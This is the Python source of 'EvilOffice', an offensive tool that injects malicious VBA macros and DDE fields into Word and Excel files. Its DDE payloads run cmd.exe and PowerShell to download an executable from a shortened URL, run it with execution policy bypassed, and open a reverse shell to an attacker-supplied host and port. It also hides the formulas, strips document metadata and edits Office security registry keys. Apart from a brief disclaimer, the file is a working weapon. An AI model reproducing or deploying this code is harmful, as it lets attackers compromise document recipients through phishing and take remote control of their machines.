#!/usr/bin/env python
# encoding: utf-8
# EvilOffice v1.0
# https://github.com/thelinuxchoice/eviloffice
# Inject Macro and DDE code into Excel and Word documents.
# coded by: @linux_choice (twitter)
# based on macro_pack, a amazing tool by @EmericNasi (https://github.com/sevagas/macro_pack)
# Read the LICENSE if you use any part from this code.

# necessary imports
import os, sys
from os import path
import platform
import signal

if platform.system().lower() == "windows":
    os.system('color')
    import win32com.client
    import winreg
else:
    print("\033[91m[+] Only for Windows :(")
    sys.exit()

try:
    input = raw_input
except NameError:
    pass


def enableVbomWord():
    # Enable writing in macro (VBOM)
    # First fetch the application version
    objWord = win32com.client.Dispatch("Word.Application")
    objWord.Visible = False  # do the operation in background
    version = objWord.Application.Version
    # IT is necessary to exit office or value wont be saved
    objWord.Application.Quit()
    del objWord
    # Next change/set AccessVBOM registry value to 1
    keyval = "Software\\Microsoft\Office\\" + version + "\\Word\\Security"
    print("\033[1;77m[-] Set %s to 1...\033[0m" % keyval)
    Registrykey = winreg.CreateKey(winreg.HKEY_CURRENT_USER, keyval)
    winreg.SetValueEx(Registrykey, "AccessVBOM", 0, winreg.REG_DWORD, 1)  # "REG_DWORD"
    winreg.CloseKey(Registrykey)


def disableVbomWord():
    # Disable writing in VBA project
    #  Change/set AccessVBOM registry value to 0
    objWord = win32com.client.Dispatch("Word.Application")
    objWord.Visible = False  # do the operation in background
    version = objWord.Application.Version
    keyval = "Software\\Microsoft\Office\\" + version + "\\Word\\Security"
    print("\033[1;77m[-] Set %s to 0...\033[0m" % keyval)
    Registrykey = winreg.CreateKey(winreg.HKEY_CURRENT_USER, keyval)
    winreg.SetValueEx(Registrykey, "AccessVBOM", 0, winreg.REG_DWORD, 0)  # "REG_DWORD"
    winreg.CloseKey(Registrykey)


def enableVbomExcel():
    # Enable writing in macro (VBOM)
    # First fetch the application version

    # IT is necessary to exit office or value wont be saved
    objExcel = win32com.client.Dispatch("Excel.Application")
    objExcel.Visible = False  # do the operation in background
    version = objExcel.Application.Version
    objExcel.Application.Quit()
    del objExcel
    # Next change/set AccessVBOM registry value to 1
    keyval = "Software\\Microsoft\Office\\" + version + "\\Excel\\Security"
    print("\033[1;77m[-] Set %s to 1...\033[0m" % keyval)
    Registrykey = winreg.CreateKey(winreg.HKEY_CURRENT_USER, keyval)
    winreg.SetValueEx(Registrykey, "AccessVBOM", 0, winreg.REG_DWORD, 1)  # "REG_DWORD"
    winreg.CloseKey(Registrykey)


def disableVbomExcel():
    # Disable writing in VBA project
    #  Change/set AccessVBOM registry value to 0
    objExcel = win32com.client.Dispatch("Excel.Application")
    objExcel.Visible = False  # do the operation in background
    version = objExcel.Application.Version
    keyval = "Software\\Microsoft\Office\\" + version + "\\Excel\\Security"
    print("\033[1;77m[-] Set %s to 0...\033[0m" % keyval)
    Registrykey = winreg.CreateKey(winreg.HKEY_CURRENT_USER, keyval)
    winreg.SetValueEx(Registrykey, "AccessVBOM", 0, winreg.REG_DWORD, 0)  # "REG_DWORD"
    winreg.CloseKey(Registrykey)


def wordMacro(filepath, lhost, lport):
    enableVbomWord()
    fin = open("macroW.txt", "rt")
    fout = open("macroW.vba", "wt")
    for line in fin:
        fout.write(line.replace('LHOST', lhost).replace('LPORT', lport))
    fin.close()
    fout.close()

    # get directory where the script is located
    _file = os.path.abspath(sys.argv[0])
    path = os.path.dirname(_file)

    # set file paths and macro name accordingly - here we assume that the files are located in the same folder as the Python script
    pathToWordFile = path + '/' + filepath
    pathToMacro = path + '/macroW.vba'

    # read the textfile holding the Word macro into a string
    with open(pathToMacro, "r") as myfile:
        print('\033[1;77m[-] Reading macro into string from: \033[0m' + str(myfile))
        macro = myfile.read()

    # open up an instance of Word with the win32com driver
    Word = win32com.client.Dispatch("Word.Application")

    # do the operation in background without actually opening Word
    Word.Visible = False

    # insert the macro-string into the Word file
    document = Word.Documents.Open(pathToWordFile)
    wordModule = document.VBProject.VBComponents("ThisDocument")
    wordModule.CodeModule.AddFromString(macro)

    # Remove Informations
    print("\033[1;77m[-] Remove hidden data and personal info...\033[0m")
    wdRDIAll = 99
    document.RemoveDocumentInformation(wdRDIAll)
    document.Save()
    document.Close()
    Word.Application.Quit()
    # garbage collection
    del Word
    disableVbomWord()


def excelMacro(filepath, lhost, lport):
    # Enable VBOM permission
    enableVbomExcel()
    # get directory where the script is located

    fin = open("macroE.txt", "rt")
    fout = open("macroE.vba", "wt")

    for line in fin:
        fout.write(line.replace('LHOST', lhost).replace('LPORT', lport))

    fin.close()
    fout.close()

    _file = os.path.abspath(sys.argv[0])
    path = os.path.dirname(_file)
    # set file paths and macro name accordingly - here we assume that the files are located in the same folder as the Python script
    pathToExcelFile = path + '/' + filepath
    pathToMacro = path + '/macroE.vba'

    # read the textfile holding the excel macro into a string
    with open(pathToMacro, "r") as myfile:
        print('\033[1;77m[-] Reading macro into string from: \033[0m' + str(myfile))
        macro = myfile.read()

    # open up an instance of Excel with the win32com driver
    excel = win32com.client.Dispatch("Excel.Application")

    # do the operation in background without actually opening Excel
    excel.Visible = False

    # open the excel workbook from the specified file
    workbook = excel.Workbooks.Open(Filename=pathToExcelFile)

    # insert the macro-string into the excel file
    excelModule = workbook.VBProject.VBComponents.Add(1)
    excelModule.CodeModule.AddFromString(macro)

    # remove personal info
    print("\033[1;77m[-] Remove hidden data and personal info...\033[0m")
    xlRDIAll = 99
    workbook.RemoveDocumentInformation(xlRDIAll)
    # save the workbook and close
    excel.Workbooks(1).Close(SaveChanges=1)
    excel.Application.Quit()
    # garbage collection
    del excel

    # disable VBOM permission
    disableVbomExcel()


def wordDDE(filepath, lhost, lport):
    # enable VBOM permission
    enableVbomWord()
    # get directory where the script is located
    _file = os.path.abspath(sys.argv[0])
    path = os.path.dirname(_file)
    # set file paths and macro name accordingly - here we assume that the files are located in the same folder as the Python script
    pathToWordFile = path + '/' + filepath

    print("\033[1;77m[+] Include DDE attack...\033[0m")
    # Get command line

    print("\033[1;77m[-] Open document...\033[0m")
    # open up an instance of Word with the win32com driver
    word = win32com.client.Dispatch("Word.Application")
    # do the operation in background without actually opening Excel
    word.Visible = True
    document = word.Documents.Open(pathToWordFile)

    print("\033[1;93m[-] Inject DDE field (Answer 'No' to all popup)...\033[0m")

    command = "echo wget http://tinyurl.com/y88r9epk -OutFile a.exe > \\s.ps1 ^#& cmd.exe"
    command2 = "powershell -ExecutionPolicy ByPass -File \\s.ps1 ^#& cmd.exe"
    command3 = "START \\a.exe %s %s -e cmd.exe -d ^#& calc.exe" % (lhost, lport)
    ddeCmd = r'"\"c:\\Program Files\\Microsoft Office\\MSWORD\\..\\..\\..\\windows\\system32\\cmd.exe\" /c %s" "."' % command
    ddeCmd2 = r'"\"c:\\Program Files\\Microsoft Office\\MSWORD\\..\\..\\..\\windows\\system32\\cmd.exe\" /c %s" "."' % command2
    ddeCmd3 = r'"\"c:\\Program Files\\Microsoft Office\\MSWORD\\..\\..\\..\\windows\\system32\\cmd.exe\" /c %s" "."' % command3
    wdFieldDDEAuto = 46
    document.Fields.Add(Range=word.Selection.Range, Type=wdFieldDDEAuto, Text=ddeCmd, PreserveFormatting=False)
    document.Fields.Add(Range=word.Selection.Range, Type=wdFieldDDEAuto, Text=ddeCmd2, PreserveFormatting=False)
    document.Fields.Add(Range=word.Selection.Range, Type=wdFieldDDEAuto, Text=ddeCmd3, PreserveFormatting=False)

    # Remove Informations save the document and close
    print("\033[1;77m[-] Remove hidden data and personal info...\033[0m")
    wdRDIAll = 99
    document.RemoveDocumentInformation(wdRDIAll)
    print("\033[1;77m[-] Save Document...\033[0m")
    document.Save()
    document.Close()
    word.Application.Quit()

    # garbage collection
    del word
    disableVbomWord()


def excelDDE(filepath, lhost, lport):
    # enable VBOM permission
    enableVbomExcel()
    # get directory where the script is located
    _file = os.path.abspath(sys.argv[0])
    path = os.path.dirname(_file)

    # set file paths and macro name accordingly - here we assume that the files are located in the same folder as the Python script
    pathToExcelFile = path + '/' + filepath
    print("\033[1;77m[+] Include DDE attack...\033[0m")
    # Get command line
    print("\033[1;77m[-] Open document...\033[0m")
    # open up an instance of Excel with the win32com driver\        \\
    excel = win32com.client.Dispatch("Excel.Application")
    # disable auto-open macros
    secAutomation = excel.Application.AutomationSecurity
    msoAutomationSecurityForceDisable = 3
    excel.Application.AutomationSecurity = msoAutomationSecurityForceDisable
    # do the operation in background without actually opening Excel
    excel.Visible = True
    workbook = excel.Workbooks.Open(pathToExcelFile)

    print("\033[1;93m[-] Inject DDE field (Answer 'No' to all popup)...\033[0m")

    command = "cmd.exe /c echo wget http://tinyurl.com/y88r9epk -OutFile a.exe > b.ps1"
    command2 = "cmd.exe /c timeout /t 1 ^& powershell -ExecutionPolicy ByPass -File b.ps1"
    command3 = "cmd.exe/c timeout /t 6 ^& START a.exe %s %s -e cmd.exe -d" % (lhost, lport)

    ddeCmd = r"""=MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c %s'!'A1'""" % command
    ddeCmd2 = r"""=MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c %s'!'A1'""" % command2
    ddeCmd3 = r"""=MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c %s'!'A1'""" % command3

    excel.Cells(1, 26).Formula = ddeCmd
    excel.Cells(1, 26).FormulaHidden = True

    excel.Cells(1, 27).Formula = ddeCmd2
    excel.Cells(1, 27).FormulaHidden = True

    excel.Cells(1, 28).Formula = ddeCmd3
    excel.Cells(1, 28).FormulaHidden = True

    # Remove Informations
    print("\033[1;77m[-] Remove hidden data and personal info...\033[0m")
    xlRDIAll = 99
    workbook.RemoveDocumentInformation(xlRDIAll)
    print("\033[1;77m[-] Save Document...\033[0m")
    excel.DisplayAlerts = False
    excel.Workbooks(1).Close(SaveChanges=1)
    excel.Application.Quit()
    # reenable auto-open macros
    excel.Application.AutomationSecurity = secAutomation
    # garbage collection
    del excel
    # disable VBOM permission
    disableVbomExcel()


def shutdown(signal, frame):
    print ('\n\033[1;77mCtrl+C was pressed, bye!\033[0m')
    sys.exit()


def main():
    print('\033[1;91m___________     .__.__   \033[0m\033[1;93m________   _____  _____.__               \033[0m')
    print('\033[1;91m\_   _____/__  _|__|  |  \033[0m\033[1;93m\_____  \_/ ____\/ ____\__| ____  ____   \033[0m')
    print('\033[1;91m |    __)_\_ \/ /  |  |  \033[0m\033[1;93m /   |   \   __\ |  __\|  |/ ___\/ __ \  \033[0m')
    print('\033[1;91m |        \/   /|  |  |__\033[0m\033[1;93m/    |    \  |   |  |  |  \  \__\  ___/  \033[0m')
    print('\033[1;91m/_______  / \_/ |__|____/\033[0m\033[1;93m\_______  /__|   |__|  |__|\___  >___  > \033[0m')
    print('\033[1;91m        \/               \033[0m\033[1;93m        \/                     \/    \/  \033[0m')
    print('\033[1;77mhttps://github.com/thelinuxchoice/eviloffice')
    print('\033[1;77mtwitter: @linux_choice')

    print("\n\033[1;91m Disclaimer: this tool is designed for security")
    print(" testing in an authorized simulated cyberattack")
    print(" Attacking targets without prior mutual consent")
    print(" is illegal!\033[0m\n")
    signal.signal(signal.SIGINT, shutdown)
    print('\033[1;93m [\033[0m\033[1;77m1\033[0m\033[1;93m] Macro (docm, dotm, xlsm, xltm)\033[0m')
    print('\033[1;93m [\033[0m\033[1;77m2\033[0m\033[1;93m] DDE Injection (doc,docx,dot,xls,xlsx,xlt,xltx)\033[0m')
    try:
        attack = int(input('\n\033[1;92m[+] Choose an attack option: \033[0m'))
    except:
        sys.exit()

    if attack == 1:
        filepath = input('\033[1;77m[+] File path: \033[0m')
        if path.exists(filepath):
            if not filepath.lower().endswith(('.docm', 'dotm', '.xlsm', 'xltm')):
                print('\033[1;91mInvalid format, use .docm,.xlsm or .xltm format\033[0m')
                sys.exit()
            else:
                print('\033[1;93m[-] Get LHOST/LPORT from ngrok.io, run ngrok.sh on linux\033[0m')
                lhost = input('\033[1;77m[+] LHOST: \033[0m')
                if lhost == '':
                    sys.exit()
            lport = input('\033[1;77m[+] LPORT: \033[0m')
            if lport == '':
                sys.exit()

        else:
            print("\033[1;91m[-] File not found!\033[0m")
            sys.exit()

    elif attack == 2:
        filepath = input('\033[1;77m[+] File path: \033[0m')
        if path.exists(filepath):
            if not filepath.lower().endswith(('.doc', '.docx', '.xls', '.xlsx', '.dot', 'xlt', 'xltx')):
                print('\033[1;91m[-] Invalid format, use .doc,docx,dot,xls,xlsx,xlt,xltx\033[0m')
                sys.exit()
            else:
                print('\033[1;93m[-] Get LHOST/LPORT from ngrok.io, run ngrok.sh on linux\033[0m')
                lhost = input('\033[1;77m[+] LHOST: \033[0m')
                if lhost == '':
                    sys.exit()
            lport = input('\033[1;77m[+] LPORT: \033[0m')
            if lport == '':
                sys.exit()
        else:
            print("\033[1;91m[-] File not found\033[0m")
            sys.exit()

    else:
        sys.exit()

    if filepath.lower().endswith(('.docm', 'dotm')):

        wordMacro(filepath, lhost, lport)

    elif filepath.lower().endswith(('.xlsm', '.xltm')):

        excelMacro(filepath, lhost, lport)

    elif filepath.lower().endswith(('.doc', '.docx', '.dot')):

        wordDDE(filepath, lhost, lport)

    elif filepath.lower().endswith(('.xls', '.xlsx', 'xlt', 'xltx')):

        excelDDE(filepath, lhost, lport)

    else:
        sys.exit()


if __name__ == '__main__':
    main()
